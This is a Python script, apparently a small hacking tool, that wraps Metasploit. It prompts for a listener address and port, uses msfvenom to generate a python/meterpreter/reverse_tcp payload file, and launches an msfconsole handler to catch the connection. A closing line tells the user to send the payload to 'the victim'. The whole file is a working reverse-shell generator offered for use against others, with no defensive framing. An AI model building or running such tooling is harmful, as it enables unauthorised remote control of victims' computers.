import os
import sys
import socket
from check import *

check_root()
check_os()

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip_status = (s.getsockname()[0])
except OSError:
    print('Нет интернета')
    sys.exit

clear()

logo = f'''
 *******             **   **                       
/**////**  **   **  /**  /**                       
/**   /** //** **  ******/**       ******  ******* 
/*******   //***  ///**/ /******  **////**//**///**
/**////     /**     /**  /**///**/**   /** /**  /**
/**         **      /**  /**  /**/**   /** /**  /**
/**        **       //** /**  /**//******  ***  /**
//        //         //  //   //  //////  ///   // 

Code by: mython-dev:)
Instagram: @h4ckerworld or @mython-dev   

'''


def payloads():
    print(logo)
    try:
        print(f'Your LHOST: "{ip_status}"\n')
        lhost = input(f'Enter LHOST: ')
        print(f'Port example: "4444"')
        lport = input(f'Enter lport: ')
    except KeyboardInterrupt:
        print('\nВыход!\n')
        sys.exit()

    # i use payload for python python/meterpreter/reverse_tcp

    os.system(f'msfvenom -p python/meterpreter/reverse_tcp lhost={lhost} lport={lport} R > {directory}/mythicalpayload.py')

    print(f'\nSaved payload: {directory}/mythicalpayload.py\n')

    os.system(f'msfconsole -q -x "use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost {lhost} ; set lport {lport} ; run ; "')

    print(f'\nSend the newly created payload to the victim: {directory}/mythicalpayload.py\n')

payloads()
